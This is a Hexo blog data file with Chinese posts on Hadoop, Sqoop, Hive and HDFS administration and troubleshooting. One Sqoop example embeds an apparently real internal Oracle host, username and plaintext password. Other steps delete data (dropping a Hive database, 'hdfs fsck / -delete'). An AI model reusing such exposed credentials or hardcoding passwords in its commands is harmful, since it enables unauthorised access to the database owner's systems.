href=\"http://blog.csdn.net/dslztx/article/details/46445725\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/dslztx/article/details/46445725</a></p>\n<p><a href=\"https://issues.apache.org/jira/browse/MAPREDUCE-6447\" target=\"_blank\" rel=\"noopener\">https://issues.apache.org/jira/browse/MAPREDUCE-6447</a></p>\n<p><a href=\"http://hs03:7180/cmf/services/13/config#filterfreeText=shuffle\" target=\"_blank\" rel=\"noopener\">http://hs03:7180/cmf/services/13/config#filterfreeText=shuffle</a></p>\n"},{"title":"sqoop-sqoop使用","date":"2018-07-10T13:09:19.000Z","_content":"sql 中加入单引号包围的常量''\n```\nsqoop import \n--connect jdbc:oracle:thin:@//10.20.23.93:1521/HS2008 \n--username hs_his\n--password hundsun \n--query \"SELECT 'bopcategory' as tag,a.* FROM hs_acpt.bopcategory a WHERE a.acpt_category_level = '2' and \\$CONDITIONS\" \n--split-by a.acpt_category_no \n--target-dir /usr/root/accept/bopcategory \n--fields-terminated-by \"#\"\n```\n","source":"_posts/Hadoop/sqoop-sqoop使用.md","raw":"---\ntitle: sqoop-sqoop使用\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\nsql 中加入单引号包围的常量''\n```\nsqoop import \n--connect jdbc:oracle:thin:@//10.20.23.93:1521/HS2008 \n--username hs_his\n--password hundsun \n--query \"SELECT 'bopcategory' as tag,a.* FROM hs_acpt.bopcategory a WHERE a.acpt_category_level = '2' and \\$CONDITIONS\" \n--split-by a.acpt_category_no \n--target-dir /usr/root/accept/bopcategory \n--fields-terminated-by \"#\"\n```\n","slug":"Hadoop/sqoop-sqoop使用","published":1,"updated":"2018-07-10T13:10:09.882Z","_id":"cjjedmh9a00280gtjo0iug43m","comments":1,"layout":"post","photos":[],"link":"","content":"<p>sql 中加入单引号包围的常量’’<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqoop import </span><br><span class=\"line\">--connect jdbc:oracle:thin:@//10.20.23.93:1521/HS2008 </span><br><span class=\"line\">--username hs_his</span><br><span class=\"line\">--password hundsun </span><br><span class=\"line\">--query &quot;SELECT &apos;bopcategory&apos; as tag,a.* FROM hs_acpt.bopcategory a WHERE a.acpt_category_level = &apos;2&apos; and \\$CONDITIONS&quot; </span><br><span class=\"line\">--split-by a.acpt_category_no </span><br><span class=\"line\">--target-dir /usr/root/accept/bopcategory </span><br><span class=\"line\">--fields-terminated-by &quot;#&quot;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>sql 中加入单引号包围的常量’’<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqoop import </span><br><span class=\"line\">--connect jdbc:oracle:thin:@//10.20.23.93:1521/HS2008 </span><br><span class=\"line\">--username hs_his</span><br><span class=\"line\">--password hundsun </span><br><span class=\"line\">--query &quot;SELECT &apos;bopcategory&apos; as tag,a.* FROM hs_acpt.bopcategory a WHERE a.acpt_category_level = &apos;2&apos; and \\$CONDITIONS&quot; </span><br><span class=\"line\">--split-by a.acpt_category_no </span><br><span class=\"line\">--target-dir /usr/root/accept/bopcategory </span><br><span class=\"line\">--fields-terminated-by &quot;#&quot;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"sqoop-sqoop使用示例","date":"2018-07-10T13:09:19.000Z","_content":"### sqoop\nSqoop是一款开源的工具，主要用于在HADOOP不传统的数据库(mysql、postgresql等)进行数据的传递，可以将一个关系型数据库（例如：MySQL、Oracle、Postgres等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中。Sqoop中一大亮点就是可以通过hadoop的mapreduce把数据从关系型数据库中导入数据到HDFS。\n### 参数配置\n##### 1.使用参数\n```\nsqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST\n```\n##### 2.使用文件\n```\nsqoop --options-file /users/homer/work/import.txt --table TEST\n```\nimport.txt如下：\n```\nimport\n--connect\njdbc:mysql://localhost/db\n--username\nfoo\n```\n配置文件支持添加注释\n```\n#\n# Options file for Sqoop import\n#\n# Specifies the tool being invoked\nimport\n# Connect parameter and value\n--connect\njdbc:mysql://localhost/db\n# Username parameter and value\n--username\nfoo\n#\n# Remaining options should be specified in the command line.\n```\n### 数据导入\n#### 1.连接数据库\n连接\n\n    $ sqoop import --connect jdbc:mysql://database.example.com/employees\n    \n    #添加用户名和密码配置\n    sqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST\n安全考虑可以把password放在文件里\n\n    sqoop import --connect jdbc:mysql://database.example.com/employees \\\n    --username venkatesh --password-file ${user.home}/.password\n\n#### 2.选择导出数据\n--table可以配置要导出的表\n    \n    sqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST\n--columns 可以配置要导出的列名\n\n     --columns \"name,employee_id,jobtitle\"\n     \n     sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd --table user \\\n     --columns \"name,id,age\"\n--where 设置选择条件\n\n    --where \"age > 400\"\n    sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd --table user \\\n    --where \"age > 400\"\n    \n#### 3.使用sql语句\n--query 和--target-dir一起使用\n\n    sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n    --query 'SELECT a.*, b.* FROM a JOIN b on (a.id == b.id) WHERE $CONDITIONS' \\\n    --split-by a.id --target-dir /user/foo/joinresults\n\n -m [number] 设置map数量\n \n    #设置1个map\n    sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n    --query 'SELECT a.*, b.* FROM a JOIN b on (a.id == b.id) WHERE $CONDITIONS' \\\n    -m 1 --split-by a.id --target-dir /user/foo/joinresults\n\n#### 4.分隔取出的数据\n\n --fields-terminated-by 设置字段之间的分隔符  --lines-terminated-by 设置每行之间的分隔符\n    \n    sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n    --fields-terminated-by \"\\0001\"  --lines-terminated-by \"\\n\";","source":"_posts/Hadoop/sqoop-sqoop使用示例.md","raw":"---\ntitle: sqoop-sqoop使用示例\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n### sqoop\nSqoop是一款开源的工具，主要用于在HADOOP不传统的数据库(mysql、postgresql等)进行数据的传递，可以将一个关系型数据库（例如：MySQL、Oracle、Postgres等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中。Sqoop中一大亮点就是可以通过hadoop的mapreduce把数据从关系型数据库中导入数据到HDFS。\n### 参数配置\n##### 1.使用参数\n```\nsqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST\n```\n##### 2.使用文件\n```\nsqoop --options-file /users/homer/work/import.txt --table TEST\n```\nimport.txt如下：\n```\nimport\n--connect\njdbc:mysql://localhost/db\n--username\nfoo\n```\n配置文件支持添加注释\n```\n#\n# Options file for Sqoop import\n#\n# Specifies the tool being invoked\nimport\n# Connect parameter and value\n--connect\njdbc:mysql://localhost/db\n# Username parameter and value\n--username\nfoo\n#\n# Remaining options should be specified in the command line.\n```\n### 数据导入\n#### 1.连接数据库\n连接\n\n    $ sqoop import --connect jdbc:mysql://database.example.com/employees\n    \n    #添加用户名和密码配置\n    sqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST\n安全考虑可以把password放在文件里\n\n    sqoop import --connect jdbc:mysql://database.example.com/employees \\\n    --username venkatesh --password-file ${user.home}/.password\n\n#### 2.选择导出数据\n--table可以配置要导出的表\n    \n    sqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST\n--columns 可以配置要导出的列名\n\n     --columns \"name,employee_id,jobtitle\"\n     \n     sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd --table user \\\n     --columns \"name,id,age\"\n--where 设置选择条件\n\n    --where \"age > 400\"\n    sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd --table user \\\n    --where \"age > 400\"\n    \n#### 3.使用sql语句\n--query 和--target-dir一起使用\n\n    sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n    --query 'SELECT a.*, b.* FROM a JOIN b on (a.id == b.id) WHERE $CONDITIONS' \\\n    --split-by a.id --target-dir /user/foo/joinresults\n\n -m [number] 设置map数量\n \n    #设置1个map\n    sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n    --query 'SELECT a.*, b.* FROM a JOIN b on (a.id == b.id) WHERE $CONDITIONS' \\\n    -m 1 --split-by a.id --target-dir /user/foo/joinresults\n\n#### 4.分隔取出的数据\n\n --fields-terminated-by 设置字段之间的分隔符  --lines-terminated-by 设置每行之间的分隔符\n    \n    sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n    --fields-terminated-by \"\\0001\"  --lines-terminated-by \"\\n\";","slug":"Hadoop/sqoop-sqoop使用示例","published":1,"updated":"2018-07-10T13:10:09.883Z","_id":"cjjedmh9a002a0gtjxp2v7rci","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"sqoop\"><a href=\"#sqoop\" class=\"headerlink\" title=\"sqoop\"></a>sqoop</h3><p>Sqoop是一款开源的工具，主要用于在HADOOP不传统的数据库(mysql、postgresql等)进行数据的传递，可以将一个关系型数据库（例如：MySQL、Oracle、Postgres等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中。Sqoop中一大亮点就是可以通过hadoop的mapreduce把数据从关系型数据库中导入数据到HDFS。</p>\n<h3 id=\"参数配置\"><a href=\"#参数配置\" class=\"headerlink\" title=\"参数配置\"></a>参数配置</h3><h5 id=\"1-使用参数\"><a href=\"#1-使用参数\" class=\"headerlink\" title=\"1.使用参数\"></a>1.使用参数</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-使用文件\"><a href=\"#2-使用文件\" class=\"headerlink\" title=\"2.使用文件\"></a>2.使用文件</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqoop --options-file /users/homer/work/import.txt --table TEST</span><br></pre></td></tr></table></figure>\n<p>import.txt如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import</span><br><span class=\"line\">--connect</span><br><span class=\"line\">jdbc:mysql://localhost/db</span><br><span class=\"line\">--username</span><br><span class=\"line\">foo</span><br></pre></td></tr></table></figure></p>\n<p>配置文件支持添加注释<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#</span><br><span class=\"line\"># Options file for Sqoop import</span><br><span class=\"line\">#</span><br><span class=\"line\"># Specifies the tool being invoked</span><br><span class=\"line\">import</span><br><span class=\"line\"># Connect parameter and value</span><br><span class=\"line\">--connect</span><br><span class=\"line\">jdbc:mysql://localhost/db</span><br><span class=\"line\"># Username parameter and value</span><br><span class=\"line\">--username</span><br><span class=\"line\">foo</span><br><span class=\"line\">#</span><br><span class=\"line\"># Remaining options should be specified in the command line.</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数据导入\"><a href=\"#数据导入\" class=\"headerlink\" title=\"数据导入\"></a>数据导入</h3><h4 id=\"1-连接数据库\"><a href=\"#1-连接数据库\" class=\"headerlink\" title=\"1.连接数据库\"></a>1.连接数据库</h4><p>连接</p>\n<pre><code>$ sqoop import --connect jdbc:mysql://database.example.com/employees\n\n#添加用户名和密码配置\nsqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST\n</code></pre><p>安全考虑可以把password放在文件里</p>\n<pre><code>sqoop import --connect jdbc:mysql://database.example.com/employees \\\n--username venkatesh --password-file ${user.home}/.password\n</code></pre><h4 id=\"2-选择导出数据\"><a href=\"#2-选择导出数据\" class=\"headerlink\" title=\"2.选择导出数据\"></a>2.选择导出数据</h4><p>–table可以配置要导出的表</p>\n<pre><code>sqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST\n</code></pre><p>–columns 可以配置要导出的列名</p>\n<pre><code>--columns &quot;name,employee_id,jobtitle&quot;\n\nsqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd --table user \\\n--columns &quot;name,id,age&quot;\n</code></pre><p>–where 设置选择条件</p>\n<pre><code>--where &quot;age &gt; 400&quot;\nsqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd --table user \\\n--where &quot;age &gt; 400&quot;\n</code></pre><h4 id=\"3-使用sql语句\"><a href=\"#3-使用sql语句\" class=\"headerlink\" title=\"3.使用sql语句\"></a>3.使用sql语句</h4><p>–query 和–target-dir一起使用</p>\n<pre><code>sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n--query &apos;SELECT a.*, b.* FROM a JOIN b on (a.id == b.id) WHERE $CONDITIONS&apos; \\\n--split-by a.id --target-dir /user/foo/joinresults\n</code></pre><p> -m [number] 设置map数量</p>\n<pre><code>#设置1个map\nsqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n--query &apos;SELECT a.*, b.* FROM a JOIN b on (a.id == b.id) WHERE $CONDITIONS&apos; \\\n-m 1 --split-by a.id --target-dir /user/foo/joinresults\n</code></pre><h4 id=\"4-分隔取出的数据\"><a href=\"#4-分隔取出的数据\" class=\"headerlink\" title=\"4.分隔取出的数据\"></a>4.分隔取出的数据</h4><p> –fields-terminated-by 设置字段之间的分隔符  –lines-terminated-by 设置每行之间的分隔符</p>\n<pre><code>sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n--fields-terminated-by &quot;\\0001&quot;  --lines-terminated-by &quot;\\n&quot;;\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"sqoop\"><a href=\"#sqoop\" class=\"headerlink\" title=\"sqoop\"></a>sqoop</h3><p>Sqoop是一款开源的工具，主要用于在HADOOP不传统的数据库(mysql、postgresql等)进行数据的传递，可以将一个关系型数据库（例如：MySQL、Oracle、Postgres等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中。Sqoop中一大亮点就是可以通过hadoop的mapreduce把数据从关系型数据库中导入数据到HDFS。</p>\n<h3 id=\"参数配置\"><a href=\"#参数配置\" class=\"headerlink\" title=\"参数配置\"></a>参数配置</h3><h5 id=\"1-使用参数\"><a href=\"#1-使用参数\" class=\"headerlink\" title=\"1.使用参数\"></a>1.使用参数</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-使用文件\"><a href=\"#2-使用文件\" class=\"headerlink\" title=\"2.使用文件\"></a>2.使用文件</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqoop --options-file /users/homer/work/import.txt --table TEST</span><br></pre></td></tr></table></figure>\n<p>import.txt如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import</span><br><span class=\"line\">--connect</span><br><span class=\"line\">jdbc:mysql://localhost/db</span><br><span class=\"line\">--username</span><br><span class=\"line\">foo</span><br></pre></td></tr></table></figure></p>\n<p>配置文件支持添加注释<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#</span><br><span class=\"line\"># Options file for Sqoop import</span><br><span class=\"line\">#</span><br><span class=\"line\"># Specifies the tool being invoked</span><br><span class=\"line\">import</span><br><span class=\"line\"># Connect parameter and value</span><br><span class=\"line\">--connect</span><br><span class=\"line\">jdbc:mysql://localhost/db</span><br><span class=\"line\"># Username parameter and value</span><br><span class=\"line\">--username</span><br><span class=\"line\">foo</span><br><span class=\"line\">#</span><br><span class=\"line\"># Remaining options should be specified in the command line.</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数据导入\"><a href=\"#数据导入\" class=\"headerlink\" title=\"数据导入\"></a>数据导入</h3><h4 id=\"1-连接数据库\"><a href=\"#1-连接数据库\" class=\"headerlink\" title=\"1.连接数据库\"></a>1.连接数据库</h4><p>连接</p>\n<pre><code>$ sqoop import --connect jdbc:mysql://database.example.com/employees\n\n#添加用户名和密码配置\nsqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST\n</code></pre><p>安全考虑可以把password放在文件里</p>\n<pre><code>sqoop import --connect jdbc:mysql://database.example.com/employees \\\n--username venkatesh --password-file ${user.home}/.password\n</code></pre><h4 id=\"2-选择导出数据\"><a href=\"#2-选择导出数据\" class=\"headerlink\" title=\"2.选择导出数据\"></a>2.选择导出数据</h4><p>–table可以配置要导出的表</p>\n<pre><code>sqoop import --connect jdbc:mysql://localhost/db --username foo --table TEST\n</code></pre><p>–columns 可以配置要导出的列名</p>\n<pre><code>--columns &quot;name,employee_id,jobtitle&quot;\n\nsqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd --table user \\\n--columns &quot;name,id,age&quot;\n</code></pre><p>–where 设置选择条件</p>\n<pre><code>--where &quot;age &gt; 400&quot;\nsqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd --table user \\\n--where &quot;age &gt; 400&quot;\n</code></pre><h4 id=\"3-使用sql语句\"><a href=\"#3-使用sql语句\" class=\"headerlink\" title=\"3.使用sql语句\"></a>3.使用sql语句</h4><p>–query 和–target-dir一起使用</p>\n<pre><code>sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n--query &apos;SELECT a.*, b.* FROM a JOIN b on (a.id == b.id) WHERE $CONDITIONS&apos; \\\n--split-by a.id --target-dir /user/foo/joinresults\n</code></pre><p> -m [number] 设置map数量</p>\n<pre><code>#设置1个map\nsqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n--query &apos;SELECT a.*, b.* FROM a JOIN b on (a.id == b.id) WHERE $CONDITIONS&apos; \\\n-m 1 --split-by a.id --target-dir /user/foo/joinresults\n</code></pre><h4 id=\"4-分隔取出的数据\"><a href=\"#4-分隔取出的数据\" class=\"headerlink\" title=\"4.分隔取出的数据\"></a>4.分隔取出的数据</h4><p> –fields-terminated-by 设置字段之间的分隔符  –lines-terminated-by 设置每行之间的分隔符</p>\n<pre><code>sqoop import --connect jdbc:mysql://localhost/db --username foo --password pwd\\\n--fields-terminated-by &quot;\\0001&quot;  --lines-terminated-by &quot;\\n&quot;;\n</code></pre>"},{"title":"修改hive","date":"2018-07-10T13:09:19.000Z","_content":"- #### 1.修改设置\n修改配置hive.metastore.warehouse.dir\n\n    hive.metastore.warehouse.dir = /hive/home/warehouse\n\n- #### 2.删除原有数据库\n```\ndrop database hello cascade;\n```\n- #### 3.重建数据库\n不重建database会目录不会变","source":"_posts/Hadoop/修改hive.md","raw":"---\ntitle: 修改hive\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n- #### 1.修改设置\n修改配置hive.metastore.warehouse.dir\n\n    hive.metastore.warehouse.dir = /hive/home/warehouse\n\n- #### 2.删除原有数据库\n```\ndrop database hello cascade;\n```\n- #### 3.重建数据库\n不重建database会目录不会变","slug":"Hadoop/修改hive","published":1,"updated":"2018-07-10T13:10:09.884Z","_id":"cjjedmh9b002c0gtj0yw1ex2k","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"1-修改设置\"><a href=\"#1-修改设置\" class=\"headerlink\" title=\"1.修改设置\"></a>1.修改设置</h4><p>修改配置hive.metastore.warehouse.dir</p>\n<p>  hive.metastore.warehouse.dir = /hive/home/warehouse</p>\n</li>\n<li><h4 id=\"2-删除原有数据库\"><a href=\"#2-删除原有数据库\" class=\"headerlink\" title=\"2.删除原有数据库\"></a>2.删除原有数据库</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drop database hello cascade;</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"3-重建数据库\"><a href=\"#3-重建数据库\" class=\"headerlink\" title=\"3.重建数据库\"></a>3.重建数据库</h4><p>不重建database会目录不会变</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"1-修改设置\"><a href=\"#1-修改设置\" class=\"headerlink\" title=\"1.修改设置\"></a>1.修改设置</h4><p>修改配置hive.metastore.warehouse.dir</p>\n<p>  hive.metastore.warehouse.dir = /hive/home/warehouse</p>\n</li>\n<li><h4 id=\"2-删除原有数据库\"><a href=\"#2-删除原有数据库\" class=\"headerlink\" title=\"2.删除原有数据库\"></a>2.删除原有数据库</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drop database hello cascade;</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"3-重建数据库\"><a href=\"#3-重建数据库\" class=\"headerlink\" title=\"3.重建数据库\"></a>3.重建数据库</h4><p>不重建database会目录不会变</p>\n</li>\n</ul>\n"},{"title":"增加HDFS存储空间","date":"2018-07-10T13:09:19.000Z","_content":"- ### 查看存储空间\r\n```\r\nhadoop  fs -du -h /# 查看hdfs根目录下使用量\r\n    \r\n[root@hs03 yfzx]# hadoop fs -du -h /\r\n759      2.2 K    /abc\r\n7.3 K    21.8 K   /bigdata\r\n549.3 M  1.6 G    /cdh\r\n281.6 K  844.8 K  /data\r\n0        0        /input\r\n84       252      /position\r\n25.2 M   75.7 M   /table\r\n4.2 G    24.8 G   /tmp\r\n50.3 G   153.9 G  /user\r\n```\r\n- ### 设置存储空间大小\r\nUse dfs.datanode.du.reserved configuration value in\r\n\r\n$HADOOP_HOME/conf/hdfs-site.xml \r\n\r\nfor limiting disk usage.\r\n\r\n```\r\n  <property>\r\n    <name>dfs.datanode.du.reserved</name>\r\n    <!-- cluster variant -->\r\n    <value>182400</value>\r\n    <description>Reserved space in bytes per volume. Always leave this much space free for non dfs use.\r\n    </description>\r\n  </property>\r\n```","source":"_posts/Hadoop/增加HDFS存储空间.md","raw":"---\ntitle: 增加HDFS存储空间\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n- ### 查看存储空间\r\n```\r\nhadoop  fs -du -h /# 查看hdfs根目录下使用量\r\n    \r\n[root@hs03 yfzx]# hadoop fs -du -h /\r\n759      2.2 K    /abc\r\n7.3 K    21.8 K   /bigdata\r\n549.3 M  1.6 G    /cdh\r\n281.6 K  844.8 K  /data\r\n0        0        /input\r\n84       252      /position\r\n25.2 M   75.7 M   /table\r\n4.2 G    24.8 G   /tmp\r\n50.3 G   153.9 G  /user\r\n```\r\n- ### 设置存储空间大小\r\nUse dfs.datanode.du.reserved configuration value in\r\n\r\n$HADOOP_HOME/conf/hdfs-site.xml \r\n\r\nfor limiting disk usage.\r\n\r\n```\r\n  <property>\r\n    <name>dfs.datanode.du.reserved</name>\r\n    <!-- cluster variant -->\r\n    <value>182400</value>\r\n    <description>Reserved space in bytes per volume. Always leave this much space free for non dfs use.\r\n    </description>\r\n  </property>\r\n```","slug":"Hadoop/增加HDFS存储空间","published":1,"updated":"2018-07-10T13:10:09.885Z","_id":"cjjedmh9c002e0gtjcxrb1nco","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h3 id=\"查看存储空间\"><a href=\"#查看存储空间\" class=\"headerlink\" title=\"查看存储空间\"></a>查看存储空间</h3><code>`</code><br>hadoop  fs -du -h /# 查看hdfs根目录下使用量</li>\n</ul>\n<p>[root@hs03 yfzx]# hadoop fs -du -h /<br>759      2.2 K    /abc<br>7.3 K    21.8 K   /bigdata<br>549.3 M  1.6 G    /cdh<br>281.6 K  844.8 K  /data<br>0        0        /input<br>84       252      /position<br>25.2 M   75.7 M   /table<br>4.2 G    24.8 G   /tmp<br>50.3 G   153.9 G  /user</p>\n<pre><code>- ### 设置存储空间大小\nUse dfs.datanode.du.reserved configuration value in\n\n$HADOOP_HOME/conf/hdfs-site.xml \n\nfor limiting disk usage.\n\n</code></pre><p>  <property><br>    <name>dfs.datanode.du.reserved</name><br>    <!-- cluster variant --><br>    <value>182400</value><br>    <description>Reserved space in bytes per volume. Always leave this much space free for non dfs use.<br>    </description><br>  </property><br><code>`</code></p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h3 id=\"查看存储空间\"><a href=\"#查看存储空间\" class=\"headerlink\" title=\"查看存储空间\"></a>查看存储空间</h3><code>`</code><br>hadoop  fs -du -h /# 查看hdfs根目录下使用量</li>\n</ul>\n<p>[root@hs03 yfzx]# hadoop fs -du -h /<br>759      2.2 K    /abc<br>7.3 K    21.8 K   /bigdata<br>549.3 M  1.6 G    /cdh<br>281.6 K  844.8 K  /data<br>0        0        /input<br>84       252      /position<br>25.2 M   75.7 M   /table<br>4.2 G    24.8 G   /tmp<br>50.3 G   153.9 G  /user</p>\n<pre><code>- ### 设置存储空间大小\nUse dfs.datanode.du.reserved configuration value in\n\n$HADOOP_HOME/conf/hdfs-site.xml \n\nfor limiting disk usage.\n\n</code></pre><p>  <property><br>    <name>dfs.datanode.du.reserved</name><br>    <!-- cluster variant --><br>    <value>182400</value><br>    <description>Reserved space in bytes per volume. Always leave this much space free for non dfs use.<br>    </description><br>  </property><br><code>`</code></p>\n"},{"title":"报错处理","date":"2018-07-10T13:09:19.000Z","_content":"- #### Name node is in safe mode\n\n 这是因为在分布式文件系统启动的时候，开始的时候会有安全模式，当分布式文件系统处于安全模式的情况下，文件系统中的内容不允许修改也不允许删除，直到安全模式结束。安全模式主要是为了系统启动的时候检查各个DataNode上数据块的有效性，同时根据策略必要的复制或者删除部分数据块。运行期通过命令也可以进入安全模式。在实践过程中，系统启动的时候去修改和删除文件也会有安全模式不允许修改的出错提示，只需要等待一会儿即可。\n\n可以通过以下命令来手动离开安全模式：\n\n    hdfs dfsadmin -safemode leave  \n\n- #### 内存分配不合理\n\n表现\n```\n2017-12-14 18:32:32,336 ERROR [Thread-52] org.apache.hadoop.mapreduce.v2.app.rm.RMContainerAllocator: Could not deallocate container for task attemptId attempt_1513247318192_0014_r_000008_0\n\n2017-12-14 19:20:22,161 ERROR [RMCommunicator Allocator] org.apache.hadoop.mapreduce.v2.app.rm.RMContainerAllocator: Container complete event for unknown container id container_1513249512179_0014_01_000064\n```\n解决办法\n\n修改map，reduce内存和堆栈内存\n\n可能是因为设置大了，也可能是因为设置小了。要根据机器配置修改\n\n保证为map 和reduce分配内存的时候不会超过节点的内存\n```\nyarn.nodemanager.resource.memory-mb=2G\nyarn.scheduler.maximum-allocation-mb=4G\n```\n- #### 时钟不同步\n各种报错\n安装ntp\n```\n    yum install ntp\n```\n配置ntp\n```\nrestrict default ignore   //默认不允许修改或者查询ntp,并且不接收特殊封包\nrestrict 127.0.0.1        //给于本机所有权限\nrestrict 192.168.56.0 mask 255.255.255.0 notrap nomodify  //给于局域网机的机器有同步时间的权限\nserver  192.168.56.121     # local clock\ndriftfile /var/lib/ntp/drift\nfudge   127.127.1.0 stratum 10\n```\n启动 ntp：\n\n    service ntpd start\n设置开机启动:\n\n     chkconfig ntpd on\n\n- #### hdfs块丢失\n\n1、首先退出hdfs namenode safe mode\n```\n\n\n    hadoop dfsadmin -safemode leave\n```\n2、修复hdfs丢失的块\n\n```\nhadoop fsck /\n\nhdfs fsck  /  -delete //此方式会将丢失的块全部删除\n```\n\n- #### HDFS 块副本数不足\n> 块\n\n> 在HDFS中，文件是以块（block）的形式存储的，而HDFS的设计初衷也是用来处理大文件的，使用抽象块正好可以满足这一需求。具体来说，比如一个很大的文件，在单一的节点上存储是不可能的，HDFS使用逻辑块的方式将这个很大的文件分成很多块，分别存储在各个节点机器上，从而实现了大文件的存储。\n>     使用抽象块作为操作的单元，方便了存储系统的管理，具体来说，就是把文件块放在DataNode上存储，把文件的元数据信息放到NameNode上管理。\n>     最后，通过给块设置副本，可以实现容错机制。\n> \n1.设置副本数\n\ncdh界面选择hdfs,选择配置设置\n\n    dfs.replication=datanode的数量\n\n2.修改之前的副本数\n\n    hadoop fs -setrep -R 【1中设置的副本数】/\n\n- #### 